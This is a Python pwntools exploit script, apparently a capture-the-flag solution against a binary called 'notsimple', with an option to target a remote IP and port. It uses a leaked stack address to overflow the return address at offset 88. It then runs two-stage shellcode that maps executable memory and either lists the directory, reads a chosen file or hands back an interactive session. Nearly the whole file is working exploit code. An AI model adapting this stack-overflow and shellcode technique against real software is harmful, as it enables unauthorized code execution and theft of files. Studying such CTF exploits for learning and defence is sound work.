#!/usr/bin/env python3

import string

from pwn import *

the_binary = "./notsimple"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    io = remote("193.57.159.27", 47247)
elif args.STRACE:
    io = process(["strace", "-o" ,"trace.txt", the_binary])
elif args.GDB:
    io = gdb.debug(the_binary, """
        continue
    """)
else:
    io = process(the_binary)

io.recvuntil("leaking! ")
stack_leak = int(io.recvuntil("\n", drop=True), 16)
log.info("stack leak: %#x" % stack_leak)

class Const:
    rip_overwrite = 88

    mmap_size = 0x2000
    mmap_addr = 0xdead0000
    getdents_buf_addr = 0xdead1000

second_stage_sc = ""
if args.LS:
    second_stage_sc += shellcraft.open(".", oflag=(constants.O_RDONLY | constants.O_DIRECTORY))
    second_stage_sc += shellcraft.syscall("SYS_getdents64", "rax", Const.getdents_buf_addr, 0x1000)
    second_stage_sc += shellcraft.syscall("SYS_write", 1, Const.getdents_buf_addr)
elif args.CAT:
    second_stage_sc += shellcraft.cat(args.CAT)
else:
    log.error("Need LS or CAT argument")

second_stage_sc = asm(second_stage_sc)

first_stage_sc = ""
first_stage_sc += shellcraft.mmap_rwx(size=Const.mmap_size, address=Const.mmap_addr)
first_stage_sc += shellcraft.read(0, buffer="rax", count=len(second_stage_sc))
first_stage_sc += shellcraft.mov("rax", Const.mmap_addr, stack_allowed=False)
first_stage_sc += "jmp rax\n"

first_stage_sc = asm(first_stage_sc)
assert b"\n" not in first_stage_sc  # gets terminates read on newline

if len(first_stage_sc) < Const.rip_overwrite:
    first_stage_sc += b"A" * (Const.rip_overwrite - len(first_stage_sc))

payload = b""
payload += first_stage_sc
payload += p64(stack_leak)

io.sendlineafter("> ", payload)
sleep(1)

# Program is now blocking to read our second stage payload into the RWX region.
io.send(second_stage_sc)

if args.LS:
    # Extract file names from raw getdents64 output.
    getdents_data = io.recvuntil(b"\x00"*0x20, drop=True)
    curr_file = ""
    for c in getdents_data:
        c = chr(c)
        if c in string.printable:
            curr_file += c
            continue
        elif len(curr_file) >= 4:
            print(curr_file)
        curr_file = ""

    if curr_file:
        print(curr_file)
else:
    io.interactive()
